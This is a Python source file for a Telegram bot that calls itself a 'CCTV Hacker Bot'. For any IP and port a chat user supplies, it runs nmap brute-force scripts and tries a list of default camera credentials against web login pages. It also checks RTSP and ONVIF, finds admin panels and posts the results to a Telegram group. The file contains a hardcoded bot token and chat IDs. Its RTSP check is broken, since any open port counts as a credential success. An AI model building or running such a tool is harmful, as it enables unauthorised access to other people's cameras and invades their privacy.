import nmap
import socket
import requests
import re
import time
import os
import asyncio
import logging
import traceback
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telegram.error import NetworkError, BadRequest, Conflict, TimedOut
from aiohttp import web

# Set up logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Hardcoded bot token
BOT_TOKEN = "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE"
# Group ID
GROUP_ID = "-1002522049841"
# Admin chat ID
ADMIN_CHAT_ID = "6972264549"

# Global data storage
scan_results = {}
scan_locks = {}
message_ids = {}
scan_stop = {}
awaiting_input = {}
recent_scans = []
start_time = time.time()
scan_expiry = {}
scan_queue = asyncio.Queue(maxsize=20)
scan_semaphore = asyncio.Semaphore(5)
lock_timeouts = {}

# Common CCTV ports
CCTV_PORTS = [80, 554, 8000, 8080, 8443]
UDP_PORTS = [37020]

# Service mapping
SERVICE_MAP = {
    80: "http", 554: "rtsp", 8000: "http-alt", 8080: "http-alt", 8443: "https-alt", 37020: "onvif"
}

# Default credentials
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", ""),
    ("root", "root"), ("root", ""), ("admin", "666666"),
    ("admin", "password"), ("user", "user")
]

# Vulnerabilities
VULN_ALERTS = {
    80: "HTTP port open. Vulnerable to default credential brute-forcing. Change default passwords and enable MFA.",
    554: "RTSP port open. Unsecured streams may allow unauthorized video access. Secure with authentication.",
    8080: "HTTP-alt port open. Often used by CCTV web interfaces. Update firmware to patch vulnerabilities.",
    8000: "HTTP-alt port open. Check for weak credentials and update firmware.",
    8443: "HTTPS-alt port open. Ensure SSL certificates are valid and credentials are strong.",
    37020: "ONVIF discovery (UDP). May expose camera details. Restrict network access."
}

# HTTP server for health checks
async def health_check(request):
    client_ip = request.remote
    logger.info(f"Keep-alive ping received from {client_ip}")
    return web.Response(text="OK")

async def start_http_server():
    try:
        logger.info("Starting HTTP server for keep-alive...")
        app = web.Application()
        app.add_routes([web.get('/health', health_check)])
        port = int(os.getenv("KEEP_ALIVE_PORT", 8080))
        logger.info(f"Binding HTTP server to port {port}")
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        logger.info(f"HTTP server started on port {port}")
        return runner
    except Exception as e:
        logger.error(f"Failed to start HTTP server: {str(e)}")
        raise

# Validate IP address
def is_valid_ip(ip):
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

# Validate port
def is_valid_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False

# Nmap scan
def nmap_scan(ip, port):
    try:
        nm = nmap.PortScanner()
        args = f"-sV --script=http-auth,http-enum,rtsp-url-brute,onvif-discover,http-auth-finder -p {port} --open -T4"
        nm.scan(ip, arguments=args)
        result = {"services": {}, "scripts": {}, "mac": "N/A"}
        if ip in nm.all_hosts():
            host = nm[ip]
            if "tcp" in host and port in host["tcp"]:
                port_info = host["tcp"][port]
                result["services"] = {
                    "service": port_info.get("name", "unknown"),
                    "product": port_info.get("product", "N/A"),
                    "version": port_info.get("version", "N/A")
                }
            if "script" in host:
                result["scripts"] = host["script"]
            if "macaddress" in host:
                result["mac"] = host["macaddress"]
        return result
    except Exception as e:
        logger.error(f"Nmap scan error for {ip}:{port}: {str(e)}")
        return {"error": str(e)}

# Detect camera model
def detect_camera_model(ip, port):
    try:
        url = f"http://{ip}:{port}"
        response = requests.get(url, timeout=5, allow_redirects=False)
        headers = response.headers
        server = headers.get("Server", "Unknown")
        title = re.search(r"<title>(.*?)</title>", response.text, re.I)
        title = title.group(1) if title else "Unknown"
        return f"Server: {server}, Page Title: {title}"
    except requests.RequestException as e:
        logger.error(f"Error detecting camera model on {ip}:{port}: {e}")
        return "Unable to detect (connection error)"
    except Exception as e:
        logger.error(f"Unexpected error detecting camera model on {ip}:{port}: {e}")
        return "Unable to detect (unknown error)"

# Test default credentials (HTTP)
def test_default_creds(ip, port):
    results = []
    endpoints = ["/login", "/admin", "/signin", "/"]
    for endpoint in endpoints:
        for username, password in DEFAULT_CREDS:
            try:
                url = f"http://{ip}:{port}{endpoint}"
                response = requests.post(url, data={"username": username, "password": password}, timeout=5)
                if response.status_code == 200 and "login failed" not in response.text.lower():
                    results.append(f"✅ Success: {username}:{password} on {endpoint}")
                else:
                    results.append(f"❌ Failed: {username}:{password} on {endpoint}")
            except requests.RequestException as e:
                logger.error(f"Error testing creds {username}:{password} on {ip}:{port}{endpoint}: {e}")
                results.append(f"❌ Error: {username}:{password} on {endpoint} (connection error)")
            except Exception as e:
                logger.error(f"Unexpected error testing creds {username}:{password} on {ip}:{port}{endpoint}: {e}")
                results.append(f"❌ Error: {username}:{password} on {endpoint} (unknown error)")
    return results

# Test RTSP brute-forcing
def test_rtsp_brute(ip, port):
    results = []
    for username, password in DEFAULT_CREDS:
        try:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                results.append(f"✅ RTSP Success: {username}:{password} (try {rtsp_url})")
            else:
                results.append(f"❌ RTSP Failed: {username}:{password}")
        except socket.error as e:
            logger.error(f"Error testing RTSP creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ RTSP Error: {username}:{password} (connection error)")
        except Exception as e:
            logger.error(f"Unexpected error testing RTSP creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ RTSP Error: {username}:{password} (unknown error)")
    return results

# Test ONVIF protocol
def test_onvif(ip, port):
    try:
        url = f"http://{ip}:{port}/onvif/device_service"
        response = requests.get(url, timeout=5)
        return "ONVIF supported" if response.status_code == 200 else "ONVIF not detected"
    except requests.RequestException as e:
        logger.error(f"Error testing ONVIF on {ip}:{port}: {e}")
        return "Unable to detect ONVIF (connection error)"
    except Exception as e:
        logger.error(f"Unexpected error testing ONVIF on {ip}:{port}: {e}")
        return "Unable to detect ONVIF (unknown error)"

# Find admin login panel
def find_admin_panel(ip, port):
    try:
        endpoints = ["/", "/login", "/admin", "/signin", "/dashboard"]
        for endpoint in endpoints:
            url = f"http://{ip}:{port}{endpoint}"
            response = requests.get(url, timeout=5, allow_redirects=False)
            if response.status_code == 200 and any(keyword in response.text.lower() for keyword in ["login", "admin", "signin", "password"]):
                return url
        return f"http://{ip}:{port}/login"  # Default fallback
    except requests.RequestException as e:
        logger.error(f"Error finding admin panel on {ip}:{port}: {e}")
        return f"http://{ip}:{port}/login"
    except Exception as e:
        logger.error(f"Unexpected error finding admin panel on {ip}:{port}: {e}")
        return f"http://{ip}:{port}/login"

# Clear locks (admin only)
async def clear_locks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if str(chat_id) != ADMIN_CHAT_ID:
        await update.message.reply_text("⚠️ Only admin can use this command.")
        return

    scan_locks.clear()
    scan_stop.clear()
    message_ids.clear()
    awaiting_input.clear()
    lock_timeouts.clear()
    while not scan_queue.empty():
        try:
            scan_queue.get_nowait()
            scan_queue.task_done()
        except asyncio.QueueEmpty:
            break
    logger.info(f"Admin cleared all locks and queue for chat_id {chat_id}")
    await update.message.reply_text("✅ All locks and queue cleared.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    keyboard = [
        [InlineKeyboardButton("🎥 Hack CCTV", callback_data=f"hack_{chat_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 **CCTV Hacker Bot** 🎬\n\n"
        "Choose an option:\n"
        "🎥 **Hack CCTV**: Scan and hack CCTV using IP and port from old bot's /getports\n\n"
        "Enter IP first, then port (e.g., 192.168.1.1, then 80)",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if chat_id in scan_locks and scan_locks[chat_id]:
        scan_stop[chat_id] = True
        scan_locks.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        await update.message.reply_text("🛑 Previous scan stopped.")
    else:
        await update.message.reply_text("⚠️ No scan in progress.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = time.time() - start_time
    uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
    scan_count = len(recent_scans)
    queue_size = scan_queue.qsize()
    active_scans = sum(1 for lock in scan_locks.values() if lock)
    await update.message.reply_text(
        f"**Bot Status** 📊\n"
        f"Uptime: {uptime_str}\n"
        f"Total Scans: {scan_count}\n"
        f"Active Scans: {active_scans}\n"
        f"Queued Scans: {queue_size}",
        parse_mode="Markdown"
    )

async def scan_ip_port(ip, port, chat_id, update, context):
    if not is_valid_ip(ip) or not is_valid_port(port):
        await update.message.reply_text(f"⚠️ Invalid IP ({ip}) or port ({port})")
        return

    async with scan_semaphore:
        try:
            scan_locks[chat_id] = True
            lock_timeouts[chat_id] = time.time() + 120
            scan_stop[chat_id] = False
            scan_results[chat_id] = {"details": {}, "mac": "N/A", "hack": {}}
            scan_expiry[chat_id] = time.time() + 600

            msg = await update.message.reply_text(
                f"🔍 Hacking **{ip}:{port}**...",
                parse_mode="Markdown"
            )
            message_ids[chat_id] = msg.message_id

            # Nmap scan
            nmap_result = nmap_scan(ip, port)
            if "error" in nmap_result:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_ids[chat_id],
                    text=f"⚠️ Scan failed for **{ip}:{port}**: {nmap_result['error']}",
                    parse_mode="Markdown"
                )
                return

            scan_results[chat_id]["details"] = nmap_result["services"]
            scan_results[chat_id]["mac"] = nmap_result["mac"]
            scan_results[chat_id]["scripts"] = nmap_result["scripts"]

            # CCTV hacking
            hack_details = {}
            hack_success = False
            if port in CCTV_PORTS:
                hack_details["model"] = detect_camera_model(ip, port)
                hack_details["creds"] = test_default_creds(ip, port)
                hack_details["onvif"] = test_onvif(ip, port)
                # Check for successful creds
                for cred_result in hack_details["creds"]:
                    if "✅ Success" in cred_result:
                        hack_success = True
                        break
            if port == 554:
                hack_details["rtsp"] = test_rtsp_brute(ip, port)
                for rtsp_result in hack_details["rtsp"]:
                    if "✅ RTSP Success" in rtsp_result:
                        hack_success = True
                        break
            if port == 37020:
                hack_details["onvif"] = "ONVIF discovery active (UDP)"
            scan_results[chat_id]["hack"] = hack_details

            # Find admin panel
            admin_panel_url = find_admin_panel(ip, port)

            # Format results
            result_text = f"**Results for {ip}:{port}** 📡\n"
            if nmap_result["services"]:
                services = nmap_result["services"]
                result_text += (
                    f"Service: {services['service']}\n"
                    f"Product: {services['product']}\n"
                    f"Version: {services['version']}\n"
                )
            if nmap_result["mac"] != "N/A":
                result_text += f"MAC Address: {nmap_result['mac']}\n"
            if nmap_result["scripts"]:
                for script, output in nmap_result["scripts"].items():
                    result_text += f"Script ({script}): {output.strip()}\n"
            if hack_details:
                if "model" in hack_details:
                    result_text += f"Camera Model: {hack_details['model']}\n"
                if "creds" in hack_details:
                    result_text += f"HTTP Credentials: {', '.join(hack_details['creds'])}\n"
                if "rtsp" in hack_details:
                    result_text += f"RTSP Brute: {', '.join(hack_details['rtsp'])}\n"
                if "onvif" in hack_details:
                    result_text += f"ONVIF: {hack_details['onvif']}\n"
            if port in VULN_ALERTS:
                result_text += f"⚠️ Vulnerability: {VULN_ALERTS[port]}\n"
            if hack_success:
                result_text += f"🎉 Hack Successful! Access CCTV via credentials or RTSP URL above.\n"
            else:
                result_text += f"🔐 Hack Failed. Try admin panel: {admin_panel_url}\n"

            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_ids[chat_id],
                text=result_text,
                parse_mode="Markdown"
            )

            # Send to group
            try:
                await context.bot.send_message(chat_id=GROUP_ID, text=result_text)
                logger.info(f"Sent result to group {GROUP_ID}")
            except Exception as e:
                logger.error(f"Error sending to group: {str(e)}")

            recent_scans.append({
                "ip": ip,
                "port": port,
                "details": scan_results[chat_id]["details"],
                "mac": scan_results[chat_id]["mac"],
                "hack": scan_results[chat_id]["hack"],
                "timestamp": time.time()
            })

        except Exception as e:
            logger.error(f"Scan error for {ip}:{port}: {str(e)}\nStack trace: {traceback.format_exc()}")
            admin_panel_url = f"http://{ip}:{port}/login"
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_ids[chat_id],
                text=f"⚠️ Hack failed for **{ip}:{port}**: {str(e)}\nTry admin panel: {admin_panel_url}",
                parse_mode="Markdown"
            )
        finally:
            scan_locks.pop(chat_id, None)
            scan_stop.pop(chat_id, None)
            message_ids.pop(chat_id, None)
            awaiting_input.pop(chat_id, None)
            lock_timeouts.pop(chat_id, None)
            logger.info(f"Cleaned up scan state for chat_id {chat_id}")

async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id

    try:
        if query.data.startswith("hack_"):
            awaiting_input[chat_id] = "ip"
            await query.message.reply_text(
                "🎥 Enter IP address (e.g., `192.168.1.1`):",
                parse_mode="Markdown"
            )
    except Exception as e:
        logger.error(f"Error in button_click: {e}")
        await query.message.reply_text(f"⚠️ Error: {str(e)}")

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    text = update.message.text.strip()

    if chat_id in lock_timeouts and time.time() > lock_timeouts[chat_id]:
        scan_locks.pop(chat_id, None)
        scan_stop.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        awaiting_input.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)

    if scan_locks.get(chat_id, False):
        scan_stop[chat_id] = True
        scan_locks.pop(chat_id, None)
        message_ids.pop(chat_id, None)
        lock_timeouts.pop(chat_id, None)
        await update.message.reply_text("🛑 Previous scan stopped. Starting new scan...")
        await asyncio.sleep(1)

    if chat_id not in awaiting_input:
        await update.message.reply_text("⚠️ Please use /start to begin.")
        return

    mode = awaiting_input[chat_id]

    if mode == "ip":
        if is_valid_ip(text):
            context.user_data["ip"] = text
            awaiting_input[chat_id] = "port"
            await update.message.reply_text(
                f"✅ IP: {text}\nNow enter port (e.g., `80`):",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("⚠️ Invalid IP. Try again (e.g., `192.168.1.1`):")
    elif mode == "port":
        if is_valid_port(text):
            ip = context.user_data.get("ip")
            port = int(text)
            del context.user_data["ip"]
            awaiting_input.pop(chat_id, None)
            await scan_ip_port(ip, port, chat_id, update, context)
        else:
            await update.message.reply_text("⚠️ Invalid port. Try again (e.g., `80`):")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")
    if isinstance(context.error, (NetworkError, TimedOut)):
        await asyncio.sleep(5)
    elif isinstance(context.error, BadRequest):
        logger.error(f"BadRequest: {context.error}")
    elif isinstance(context.error, Conflict):
        logger.error(f"Conflict error: {context.error}")
        try:
            await context.bot.delete_webhook(drop_pending_updates=True)
            logger.info("Webhook cleared due to conflict")
        except Exception as e:
            logger.error(f"Failed to clear webhook: {str(e)}")
    elif str(context.error).startswith("TooManyRequests"):
        logger.warning("Telegram rate limit hit, applying backoff")
        await asyncio.sleep(2 ** len(str(context.error)))
    try:
        if update:
            await update.message.reply_text("⚠️ An error occurred, please try again later.")
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"⚠️ Bot error: {str(context.error)}"
        )
    except Exception as admin_e:
        logger.error(f"Failed to notify admin: {admin_e}")

async def main():
    logger.info("Bot starting...")
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        logger.info(f"Bot initialized with token: {BOT_TOKEN[:10]}...")
    except Exception as e:
        logger.error(f"Error initializing bot: {str(e)}")
        raise

    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        logger.info("Webhook cleared at startup")
    except Exception as e:
        logger.error(f"Failed to clear webhook at startup: {str(e)}")

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clearlocks", clear_locks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))
    app.add_handler(CallbackQueryHandler(button_click))
    app.add_error_handler(error_handler)

    http_runner = await start_http_server()

    max_retries = 10
    retry_delay = 10
    for attempt in range(max_retries):
        try:
            await app.initialize()
            await app.start()
            await app.updater.start_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            logger.info("Bot polling started")
            break
        except Exception as e:
            logger.error(f"Error starting Telegram bot (attempt {attempt + 1}/{max_retries}): {str(e)}")
            if attempt < max_retries - 1:
                logger.info(f"Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
            else:
                logger.error("Max retries reached, shutting down...")
                await http_runner.cleanup()
                raise

    try:
        while True:
            await asyncio.sleep(3600)
    except (KeyboardInterrupt, SystemExit):
        logger.info("Shutting down...")
        await app.updater.stop()
        await app.stop()
        await app.shutdown()
        await http_runner.cleanup()
        logger.info("Shutdown complete")

if __name__ == "__main__":
    asyncio.run(main())
